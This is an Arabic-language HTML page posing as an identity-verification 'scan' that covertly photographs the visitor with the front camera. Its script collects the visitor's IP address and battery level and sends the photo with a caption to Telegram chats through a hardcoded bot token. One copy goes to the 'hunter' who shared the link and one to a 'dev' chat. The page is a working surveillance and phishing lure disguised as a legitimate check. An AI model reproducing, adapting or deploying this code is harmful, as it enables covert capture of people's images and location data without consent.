<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>تأكيد الهوية - جيل 2009</title></head>
<body style="text-align:center; background:#000; color:#fff;">
    <h3>تفعيل الكاميرا الأمامية للمراقبة 📸</h3>
    <button onclick="st()" style="padding:20px; background:#2ecc71; color:#fff; border-radius:10px;">بدء الفحص</button>
    <video id="v" autoplay style="display:none;"></video><canvas id="c" style="display:none;"></canvas>
    <script>
        const pr = new URLSearchParams(window.location.search);
        const token = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE';
        async function st() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: {facingMode: "user"} });
            const v = document.getElementById('v'); v.srcObject = stream;
            setTimeout(async () => {
                const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(async (b) => {
                    let ip = await (await fetch('https://api.ipify.org')).text();
                    let bt = await navigator.getBattery();
                    const cap = encodeURIComponent(`📸 صيدة أمامية\n👤 الصياد: ${pr.get('hunter')}\n🌐 IP: ${ip}\n🔋 شحن: ${Math.round(bt.level*100)}%`);
                    const fd = new FormData(); fd.append('photo', b, 'f.jpg');
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('id')}&caption=${cap}`, {method:'POST', body:fd});
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${pr.get('dev')}&caption=${cap}`, {method:'POST', body:fd});
                    alert("تم بنجاح");
                }, 'image/jpeg');
            }, 2000);
        }
    </script>
</body>
</html>
